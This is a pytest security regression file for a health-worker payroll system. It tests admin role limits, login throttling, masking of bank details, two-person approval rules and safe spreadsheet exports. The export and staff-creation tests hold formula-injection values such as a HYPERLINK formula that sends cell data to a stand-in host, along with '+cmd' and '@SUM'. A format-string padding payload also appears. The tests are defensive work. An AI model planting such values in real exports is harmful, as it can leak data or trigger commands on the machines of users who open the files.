"""Fixes from the pre-launch security review: each test is one way the system could have been misused."""
import io
from datetime import datetime, timedelta

import pytest
from openpyxl import load_workbook

from backend.models import AuditEvent, FinanceMonthlyReport, FinanceMonthlyReportWithdrawal, LoginFailure, SMSOutbox, Staff, StaffAssignment, User
from .conftest import PASSWORD
from .test_approval_finance_visibility import approve_to_regional_finance, prepare
from .test_bank_only_cadres import _staff
from .test_ctc_facility_approval import no_provider_sms
from .test_finance_monthly_reports import all_cadres
from .test_finance_pack import month_of
from .test_services_without_budgets import empty_period
from .test_v22_finance import v22

pytestmark = pytest.mark.usefixtures("no_provider_sms")


@pytest.fixture
def sysadmin(api, db):
    """A system administrator who is not a super administrator."""
    if not db.query(User).filter_by(username="sysadmin.plain").first():
        user = api.post("/admin/users", "admin", {"username": "sysadmin.plain", "password": PASSWORD, "full_name": "Plain Admin",
                                                  "phone": "+255700339111", "roles": ["SYSTEM_ADMIN"]}, expect=201)
        db.query(User).filter(User.id == user["id"]).update({User.must_change_password: False})
        db.commit()
    return "sysadmin.plain"


def test_a_system_admin_cannot_grant_money_or_admin_roles_or_change_their_own(api, db, sysadmin):
    me = next(u for u in api.get("/admin/users", sysadmin) if u["username"] == sysadmin)
    api.put(f"/admin/users/{me['id']}/roles", sysadmin, {"roles": ["SYSTEM_ADMIN", "CENTRAL_ADMIN"], "reason": "self"}, expect=403)
    api.put(f"/admin/users/{me['id']}/scopes", sysadmin, {"scopes": [], "reason": "self scope"}, expect=403)
    region = api.get("/admin/regions", "admin")[0]["id"]
    refused = api.call("POST", "/admin/users", sysadmin, json={
        "username": "helper.finance", "password": PASSWORD, "full_name": "Helper", "phone": "+255700339112",
        "roles": ["REGIONAL_FINANCE"], "scopes": [{"region_id": region}]}, expect=403)
    assert "super administrator" in str(refused)
    office = api.call("POST", "/admin/users", sysadmin, json={
        "username": "helper.rm", "password": PASSWORD, "full_name": "Helper", "phone": "+255700339113",
        "roles": ["RPM"], "scopes": [{"region_id": region}]}, expect=201)  # approver roles stay with system admins
    api.put(f"/admin/users/{office['id']}/roles", sysadmin, {"roles": ["RPM", "CENTRAL_ADMIN"], "reason": "grant"}, expect=403)
    # The person is told by SMS when an administrator resets their password.
    api.post(f"/admin/users/{office['id']}/reset-password", sysadmin, {"new_password": "Reset-pass-2468"}, expect=204)
    assert db.query(SMSOutbox).filter_by(user_id=office["id"], event_name="PASSWORD_RESET").count() == 1
    # Payment rules are the super administrator's.
    api.put("/admin/settings/payment_requires_proof", sysadmin, {"value": False, "reason": "try"}, expect=403)


def test_settings_and_sms_templates_stay_within_safe_limits(api):
    api.put("/admin/settings/otp_length", "admin", {"value": 2, "reason": "too short"}, expect=422)
    api.put("/admin/settings/otp_ttl_minutes", "admin", {"value": 0, "reason": "never valid"}, expect=422)
    api.put("/admin/settings/gps_capture_events", "admin", {"value": ["ANYTIME"], "reason": "bad"}, expect=422)
    api.put("/admin/settings/submit_reminder_days", "admin", {"value": [40], "reason": "bad"}, expect=422)
    template = next(t for t in api.get("/admin/sms-templates", "admin") if t["event_name"] == "WELCOME")
    padded = api.call("POST", "/admin/sms-templates/preview", "admin", json={
        "event_name": "WELCOME", "language": template["language"], "template_text": "Hi {name:>9999}"}, expect=422)
    assert "plain" in str(padded)


def test_sign_in_never_reveals_a_username_and_one_device_cannot_lock_the_account(client, db):
    for name in ("chw1", "no.such.user"):
        replies = [client.post("/auth/login", data={"username": name, "password": "Wrong-123"}).status_code for _ in range(5)]
        assert replies == [400] * 5
        blocked = client.post("/auth/login", data={"username": name, "password": "Wrong-123"})
        assert blocked.status_code == 429 and "this device" in blocked.json()["detail"]
    # The account itself is not locked: another device signs in with the right password.
    assert db.query(User).filter_by(username="chw1").one().locked_until is None
    db.query(LoginFailure).filter(LoginFailure.username.in_(["chw1", "no.such.user"])).delete()
    db.commit()
    assert client.post("/auth/login", data={"username": "chw1", "password": PASSWORD}).status_code == 200


def test_staff_audit_keeps_bank_numbers_and_tin_masked_and_search_does_not_reveal_phones(api, db):
    created = api.post("/staff", "central1", {**_staff(api, "CHW", "0755 125 401", "MOBILE_WALLET"), "tin_number": "300 400 501",
                                              "bank_name": "NMB Bank", "bank_account_number": "40112233445566"}, expect=201)
    entry = db.query(AuditEvent).filter_by(entity_type="staff", entity_id=str(created["id"]), action="create").one()
    text = str(entry.after)
    assert "40112233445566" not in text and "300-400-501" not in text and "5566" in text
    api.call("POST", "/staff", "central1", json={**_staff(api, "CHW", "0755 125 402", "MOBILE_WALLET"), "tin_number": "300 400 502",
                                                  "bank_name": "=HYPERLINK(1)", "bank_account_number": "40112233445567"}, expect=422)
    # A reviewer sees masked phones, so they cannot find people by typing phone digits either.
    assert api.get("/staff?search=755125401", "central1")
    assert not api.get("/staff?search=755125401", "supervisor1")


def test_one_person_cannot_approve_two_steps_and_a_resubmitted_timesheet_must_be_reviewed_again(api, db, empty_period, v22):
    log = prepare(api, db, empty_period, v22, "chw1", "PAYROLL")
    from backend.models import Role, UserReviewCadre, UserRole, UserScope, WorkLog
    multi = db.query(User).filter_by(username="supervisor1").one()
    tech = db.query(Role).filter_by(name="TECHNICAL_OFFICER").one()
    placement = db.get(StaffAssignment, log["assignment_id"])
    cadre = db.get(WorkLog, log["id"]).cadre_id
    # supervisor1 is also a technical officer for this region and cadre: one person holding two approval roles.
    added = [row for row in (
        None if db.query(UserRole).filter_by(user_id=multi.id, role_id=tech.id).first() else UserRole(user_id=multi.id, role_id=tech.id),
        None if db.query(UserScope).filter_by(user_id=multi.id, region_id=placement.region_id).first() else UserScope(user_id=multi.id, region_id=placement.region_id),
        None if db.get(UserReviewCadre, (multi.id, cadre)) else UserReviewCadre(user_id=multi.id, cadre_id=cadre),
    ) if row is not None]
    db.add_all(added)
    db.commit()
    try:
        body = {"review_confirmed": True, "review_type": "PAYROLL"}
        # Reviewing with a stale screen: the provider recalled and resubmitted after the reviewer opened it.
        stale = log["submitted_at"]
        api.post(f"/worklogs/{log['id']}/actions/recall", "chw1", {})
        api.post(f"/worklogs/{log['id']}/actions/submit", "chw1", {"attest": True})
        refused = api.call("POST", f"/worklogs/{log['id']}/actions/verify", "supervisor1", json={**body, "expected_submitted_at": stale}, expect=409)
        assert "resubmitted" in str(refused)
        fresh = api.get(f"/worklogs/{log['id']}", "supervisor1")
        api.post(f"/worklogs/{log['id']}/actions/verify", "supervisor1", {**body, "expected_submitted_at": fresh["submitted_at"]})
        # The same person, now acting as technical officer, may not take the next step too.
        second = api.call("POST", f"/worklogs/{log['id']}/actions/endorse", "supervisor1", json=body, expect=403)
        assert "different person" in str(second)
        assert api.post(f"/worklogs/{log['id']}/actions/endorse", "tofficer1", body)["status"] == "PENDING_RPM_AUTHORIZATION"
    finally:
        for row in added:
            db.delete(row)
        db.commit()


def test_payroll_import_file_keeps_text_that_looks_like_a_formula_as_text():
    from backend.services import finance_pack
    data = {"work_type": "PAYROLL", "month": "2026-10", "people": [{
        "staff_id": 1, "name": '=HYPERLINK("https://x/?"&M3,"Open")', "tin_number": "+cmd", "cadre": "CHW", "region": "Iringa",
        "facility": "@SUM(1)", "community_area": None, "days": 3, "amount": "100.00", "currency": "TZS",
        "bank_name": "-2+3", "bank_account_number": "0123", "bank_branch": "=1+1", "state": "x"}]}
    sheet = load_workbook(io.BytesIO(finance_pack.import_xlsx(data))).active
    assert all(cell.data_type != "f" for row in sheet.iter_rows() for cell in row)
    text = finance_pack.import_csv(data).decode("utf-8-sig")
    for risky in ('=HYPERLINK', '+cmd', '@SUM', '-2+3', '=1+1'):
        assert f",{risky}" not in text and f"\n{risky}" not in text


def test_changing_a_signed_months_salary_takes_the_sign_off_back(api, db, empty_period, v22):
    import uuid
    from .test_salary_timesheets import provider_details
    rf = v22["finance"]
    for user in (rf, "csofin1", "fhifin1"):
        all_cadres(db, user)
    log = approve_to_regional_finance(api, prepare(api, db, empty_period, v22, "hcp1", "PAYROLL"), rf)
    month, region = month_of(db, log["id"]), db.get(StaffAssignment, log["assignment_id"]).region_id
    state = {"staff_id": log["staff_id"], "scale": "SEC-" + uuid.uuid4().hex[:6]}
    with provider_details(db, state):
        api.call("PUT", "/salary-amounts", "fhifin1", {"scale": state["scale"], "start_month": month, "monthly_amount": "500000.00"})
        report = api.get(f"/finance/monthly-report?month={month}&region_id={region}&work_type=PAYROLL", rf)
        api.post("/finance/monthly-report/approve", rf, {"month": month, "region_id": region, "work_type": "PAYROLL",
                                                          "review_confirmed": True, "expected_digest": report["digest"]})
        changed = api.call("PUT", "/salary-amounts", "fhifin1", {"scale": state["scale"], "start_month": month, "monthly_amount": "900000.00"})
        assert {"month": month, "region_id": region} in changed["signed_months_taken_back"]
        after = api.get(f"/finance/monthly-report?month={month}&region_id={region}&work_type=PAYROLL", rf)
        assert after["state"] == "NOT_APPROVED" and state["scale"] in after["withdrawn"]["reason"]
